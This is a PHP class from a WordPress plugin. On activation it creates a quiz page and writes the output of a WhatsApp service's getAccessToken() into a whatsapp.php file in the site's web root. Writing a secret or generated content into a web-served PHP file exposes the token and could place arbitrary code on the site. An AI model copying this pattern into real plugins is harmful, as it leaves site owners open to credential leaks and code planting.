<?php

namespace App\Core;

use App\Services\WhatsappService;

class KuriakosPage extends KuriakosPlugin {

    public function __construct(string $file) {

        register_activation_hook($file, [$this, 'page']);
        register_activation_hook($file, [$this, 'callbacks']);

        parent::__construct($file);
    }

    public function page(): void
    {
        // Verifica se a página já existe
        $page = new \WP_Query( array(
            'post_type'  => 'page',
            'title'      => 'Esta e a Hora - Quiz', // Título da página
            'posts_per_page' => 1
        ));

        if ( ! $page->have_posts() ) {
            // Cria a página personalizada com conteúdo vazio
            wp_insert_post( array(
                'post_title'   => 'Esta e a Hora - Quiz',
                'post_content' => require_once(__DIR__ . '/../../Resources/Views/api/telegram.php'), // O conteúdo será gerado pelo shortcode
                'post_status'  => 'publish',
                'post_type'    => 'page',
                'page_template' => '', // Não usa template
            ) );
        }
    }

    public function callbacks()
    {
        $whatsapp = new WhatsappService();

        if(file_exists(ABSPATH . "whatsapp.php")) {
            unlink(ABSPATH . "whatsapp.php");
        }

        $file = fopen(ABSPATH . "whatsapp.php", "w");
        fwrite($file, $whatsapp->getAccessToken());
        fclose($file);
    }

    public static function init(string $file)
    {
        static $instance;
        if (!$instance) {
            $instance = new KuriakosPage($file);
        }
        return $instance;
    }
}